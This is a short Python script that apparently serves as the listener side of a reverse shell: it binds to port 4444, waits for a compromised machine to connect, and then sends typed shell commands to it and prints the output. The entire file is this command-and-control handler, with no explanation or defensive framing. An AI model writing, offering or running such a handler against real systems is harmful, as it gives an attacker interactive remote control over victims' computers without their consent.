import socket
import subprocess

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind(('0.0.0.0', 4444))
server_socket.listen(1)

print("* Listening on port 4444")

client_socket, client_address = server_socket.accept()
print(f"* Connected to {client_address}")

while True:
    command = input("shell> ")
    
    if command.lower() == "exit":
        client_socket.send(b"exit")
        client_socket.close()
        break
    
    client_socket.send(command.encode())

    result = client_socket.recv(4096).decode()
    print(result)
